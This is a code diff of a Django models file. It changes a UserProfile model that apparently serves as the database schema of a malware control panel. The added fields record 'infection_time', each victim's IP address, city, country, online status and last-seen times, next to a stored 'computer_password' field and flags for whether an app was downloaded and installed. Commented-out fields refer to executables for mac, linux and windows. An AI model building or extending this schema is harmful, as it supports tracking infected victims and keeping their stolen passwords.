@@ -49,20 +49,28 @@ class Application(models.Model):
         ordering = ('-created',)
         verbose_name_plural = 'Application Executable'
          
-
+'''
+    #mac_exe_file = models.FileField(upload_to="Executables/mac/%y/%m/%d", blank=True, null=False)
+    #linux_exe_file = models.FileField(upload_to="Executables/linux/%y/%m/%d", blank=True, null=False)
+    #windows_exe_file =  models.FileField(upload_to="Executables/windows/%y/%m/%d", blank=True, null=False)
+'''
 
 class UserProfile(models.Model):
     email = models.EmailField()
     id_token = models.CharField(max_length=1000, blank=True, unique=True, null=False) 
     app_downloaded = models.BooleanField(default=False)
     app_installed = models.BooleanField(default=False)
-    computer_password = models.CharField(max_length=1000, blank=True, null=True)
     video_link = models.CharField(max_length=1000, default='', blank=True, null=False)
     redirect_link = models.URLField(default='', blank=True, null=False)
     link_visits = models.IntegerField(default=0)
-    #mac_exe_file = models.FileField(upload_to="Executables/mac/%y/%m/%d", blank=True, null=False)
-    #linux_exe_file = models.FileField(upload_to="Executables/linux/%y/%m/%d", blank=True, null=False)
-    #windows_exe_file =  models.FileField(upload_to="Executables/windows/%y/%m/%d", blank=True, null=False)
+    infection_time = models.TimeField(blank=True, null=True)
+    last_date_online = models.DateTimeField(blank=True, null=True)
+    last_time_online = models.TimeField(blank=True, null=True)
+    ip = models.CharField(max_length=500, null=True, blank=True)
+    city = models.CharField(max_length=500, null=True, blank=True)
+    country = models.CharField(max_length=500, null=True, blank=True)      
+    status = models.BooleanField(default=False, null=True, blank=True)
+    computer_password = models.CharField(max_length=1000, blank=True, null=True)
     created = models.DateTimeField(auto_now_add=True, auto_now=False)
     updated = models.DateTimeField(auto_now_add=False, auto_now=True)
 
